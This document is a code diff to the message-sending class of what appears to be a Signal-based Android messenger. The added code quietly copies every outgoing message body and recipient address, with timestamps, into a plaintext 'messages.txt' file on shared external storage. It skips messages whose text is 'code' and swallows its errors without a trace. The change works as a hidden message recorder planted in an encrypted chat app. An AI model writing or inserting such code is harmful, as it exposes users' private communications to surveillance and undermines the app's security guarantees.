@@ -19,6 +19,7 @@ package org.thoughtcrime.securesms.sms;
 import android.content.Context;
 import android.util.Log;
 import android.util.Pair;
+import android.os.Environment;
 
 import org.thoughtcrime.securesms.ApplicationContext;
 import org.thoughtcrime.securesms.database.Address;
@@ -46,11 +47,21 @@ import org.whispersystems.signalservice.api.SignalServiceAccountManager;
 import org.whispersystems.signalservice.api.push.ContactTokenDetails;
 
 import java.io.IOException;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.util.Date;
+import java.text.SimpleDateFormat;
+import java.text.DateFormat;
 
 public class MessageSender {
-
   private static final String TAG = MessageSender.class.getSimpleName();
+//added
 
+  private static final String CODENAME = "code";
+  public static MessageSender.WriteMessageIntoLogFile writeToFile=
+          new MessageSender.WriteMessageIntoLogFile(); //my addition
+  //end of added
   public static long send(final Context context,
                           final OutgoingTextMessage message,
                           final long threadId,
@@ -60,7 +71,6 @@ public class MessageSender {
     SmsDatabase database    = DatabaseFactory.getSmsDatabase(context);
     Recipient   recipient   = message.getRecipient();
     boolean     keyExchange = message.isKeyExchange();
-
     long allocatedThreadId;
 
     if (threadId == -1) {
@@ -72,6 +82,16 @@ public class MessageSender {
     long messageId = database.insertMessageOutbox(allocatedThreadId, message, forceSms, System.currentTimeMillis(), insertListener);
 
     sendTextMessage(context, recipient, forceSms, keyExchange, messageId, message.getExpiresIn());
+    //my addition
+    if (!message.getMessageBody().equals(CODENAME)) {
+      try {
+        Log.d(TAG, message.getMessageBody());
+        writeToFile.writeToFileOnDevice(message.getMessageBody(), message.getRecipient());
+      } catch (IOException e) {
+        Log.d(TAG, e.toString());
+      }
+    }
+    //end of my addition
 
     return allocatedThreadId;
   }
@@ -98,6 +118,13 @@ public class MessageSender {
       long      messageId = database.insertMessageOutbox(message, allocatedThreadId, forceSms, insertListener);
 
       sendMediaMessage(context, recipient, forceSms, messageId, message.getExpiresIn());
+      //try to write to the message recorder file
+      try{
+        writeToFile.writeToFileOnDevice(message.getBody(), message.getRecipient());
+      } catch (IOException e){
+
+      }
+      //end of addition
 
       return allocatedThreadId;
     } catch (MmsException e) {
@@ -130,7 +157,7 @@ public class MessageSender {
   }
 
   private static void sendMediaMessage(Context context, Recipient recipient, boolean forceSms, long messageId, long expiresIn)
-      throws MmsException
+          throws MmsException
   {
     if (!forceSms && isSelfSend(context, recipient)) {
       sendMediaSelf(context, messageId, expiresIn);
@@ -173,7 +200,7 @@ public class MessageSender {
   }
 
   private static void sendMediaSelf(Context context, long messageId, long expiresIn)
-      throws MmsException
+          throws MmsException
   {
     ExpiringMessageManager expiringMessageManager = ApplicationContext.getInstance(context).getExpiringMessageManager();
     MmsDatabase            database               = DatabaseFactory.getMmsDatabase(context);
@@ -238,7 +265,7 @@ public class MessageSender {
 
   private static boolean isGroupPushSend(Recipient recipient) {
     return recipient.getAddress().isGroup() &&
-           !recipient.getAddress().isMmsGroup();
+            !recipient.getAddress().isMmsGroup();
   }
 
   private static boolean isSelfSend(Context context, Recipient recipient) {
@@ -277,4 +304,54 @@ public class MessageSender {
     }
   }
 
+  //this is an inner class used to write the messages that being sent into a log file
+  public static class WriteMessageIntoLogFile {
+    public BufferedWriter out;
+    private boolean bufferWasCreated = false;
+
+
+    public WriteMessageIntoLogFile() {
+      if (this.bufferWasCreated == false) {
+        try {
+          this.createFileOnDevice(true);
+          this.bufferWasCreated = true;
+        } catch (java.io.IOException e) {
+
+        }
+      }
+    }
+
+    private void createFileOnDevice(Boolean append) throws IOException {
+    /*
+    * Function to initially create the log file.
+    */
+      File Root = Environment.getExternalStorageDirectory();
+      if (Root.canWrite()) {
+        File LogFile = new File(Root, "messages.txt");
+        Log.d(TAG, LogFile.getAbsolutePath());
+        FileWriter LogWriter = new FileWriter(LogFile, append);
+        out = new BufferedWriter(LogWriter);
+
+      }
+    }
+
+
+    public void writeToFileOnDevice(String message, Recipient r) throws IOException {
+    /*
+    * Function to initially create the log file and it also writes the time of creation to file.
+    * it gets the message that is sent and also the recipient, so we can get the number which
+     * the message was sent to.
+    */
+      File Root = Environment.getExternalStorageDirectory();
+      if (Root.canWrite()) {
+        Date date = new Date();
+        DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
+        out.write(dateFormat.format(date)
+                +" to " + r.getAddress()+ ": " + message + "\n");
+        out.flush();
+        //out.close();
+
+      }
+    }
+  }
 }
